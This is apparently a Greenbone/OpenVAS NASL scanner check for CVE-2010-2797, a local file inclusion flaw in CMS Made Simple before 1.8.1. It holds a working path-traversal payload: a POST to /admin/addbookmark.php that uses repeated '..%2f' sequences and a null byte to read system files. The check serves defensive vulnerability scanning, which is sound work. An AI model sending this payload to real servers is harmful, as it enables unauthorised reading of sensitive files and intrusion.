# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cmsmadesimple:cms_made_simple";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100716");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-07-14 13:50:55 +0200 (Wed, 14 Jul 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2010-2797");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("CMS Made Simple < 1.8.1 Parameter LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_cms_made_simple_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cmsmadesimple/http/detected");

  script_tag(name:"summary", value:"CMS Made Simple is prone to a local file inclusion
  (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the underlying computer. Other
  attacks are also possible.");

  script_tag(name:"affected", value:"CMS Made Simple prior to version 1.8.1.");

  script_tag(name:"solution", value:"Update to version 1.8.1 or later.");

  script_xref(name:"URL", value:"http://cross-site-scripting.blogspot.com/2010/07/cms-made-simple-18-local-file-inclusion.html");
  script_xref(name:"URL", value:"https://www.cmsmadesimple.org/2010/07/3/announcing-cms-made-simple-1-8-1-mankara/");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2010/08/01/2");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2010/08/02/8");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service: "www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

url = dir + "/admin/addbookmark.php";

host = http_host_name(port:port);

foreach pattern(keys(files)) {

  file = files[pattern];
  ex = string("default_cms_lang=", crap(data:"..%2f", length:"50"), file, "%00");

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Accept-Encoding: identity\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(ex),
               "\r\n\r\n",
               ex);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (!res)
    continue;

  if (egrep(pattern:pattern, string:res, icase:TRUE)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);
